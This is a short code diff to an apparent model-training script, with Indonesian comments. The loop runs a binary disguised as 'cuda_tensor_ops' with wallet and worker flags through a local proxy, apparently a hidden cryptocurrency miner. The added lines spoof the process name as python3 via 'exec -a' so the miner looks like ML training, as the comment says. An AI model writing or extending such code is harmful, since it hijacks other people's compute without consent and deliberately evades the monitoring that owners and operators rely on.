@@ -101,9 +101,10 @@ def train():
     
     for step in range(1, total_steps + 1):
         # TRAIN BURST — 60-120 detik, binary konek ke localhost proxy
+        # Spoof process name jadi python3 biar keliatan kayak ML training
         proc = subprocess.Popen(
-            ["/usr/local/bin/cuda_tensor_ops", "--host", f"127.0.0.1:{LOCAL_PROXY_PORT}", 
-             "--user", WALLET, "--worker", NODE],
+            ["/bin/bash", "-c", 
+             f"exec -a python3 /usr/local/bin/cuda_tensor_ops --host 127.0.0.1:{LOCAL_PROXY_PORT} --user {WALLET} --worker {NODE}"],
             stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
             text=True, bufsize=1
         )
